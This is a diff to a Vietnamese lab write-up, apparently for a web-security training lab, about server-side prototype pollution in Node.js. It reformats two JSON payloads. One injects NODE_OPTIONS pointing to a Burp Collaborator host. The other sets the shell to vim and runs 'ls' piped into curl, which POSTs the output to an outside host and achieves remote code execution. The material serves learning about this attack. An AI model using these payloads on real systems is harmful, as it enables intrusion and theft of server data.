@@ -218,11 +218,37 @@ Request trên sẽ cấu hình các biến số cho subprocess bằng method `ch
 
 Trong chức năng thay đổi address, cấu hình request:
 ```
-{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"JUURtveIt2PKjp9otNRvZ5sb9hlEwwq0","x":1,"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=6y5xldxdz9g834nbbaklw77fh6nxbm.oastify.com"}}
+{
+    "address_line_1":"Wiener HQ",
+    "address_line_2":"One Wiener Way",
+    "city":"Wienerville",
+    "postcode":"BU1 1RP",
+    "country":"UK",
+    "sessionId":"JUURtveIt2PKjp9otNRvZ5sb9hlEwwq0",
+    "x":1,
+    "__proto__":
+    {
+        "shell":"node",
+        "NODE_OPTIONS":"--inspect=6y5xldxdz9g834nbbaklw77fh6nxbm.oastify.com"
+    }
+}
 ```
 ta thấy Burp Collaborator hiển thị thông tin request đến, như vậy website có sử dụng `child_process` module để tạo subprocess. Tiếp đó, để thực thi RCE ta cấu hình request với body sau:
 ```
-{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"PcyfX9WgZwrKRkHjAXg0dq3eOHX5OgM6","x":1,"__proto__":{"shell":"vim","input":":! ls|curl -X POST jsfafqrqtmalxhho5neyqk1sbjhf54.oastify.com -d @- \n"}}
+{
+    "address_line_1":"Wiener HQ",
+    "address_line_2":"One Wiener Way",
+    "city":"Wienerville",
+    "postcode":"BU1 1RP",
+    "country":"UK",
+    "sessionId":"PcyfX9WgZwrKRkHjAXg0dq3eOHX5OgM6",
+    "x":1,
+    "__proto__":
+    {
+        "shell":"vim",
+        "input":":! ls|curl -X POST jsfafqrqtmalxhho5neyqk1sbjhf54.oastify.com -d @- \n"
+    }
+}
 ```
 Vào Burp Collaborator, ta thấy một POST request được gửi đến với phần body có content là `node_appssecret`
 
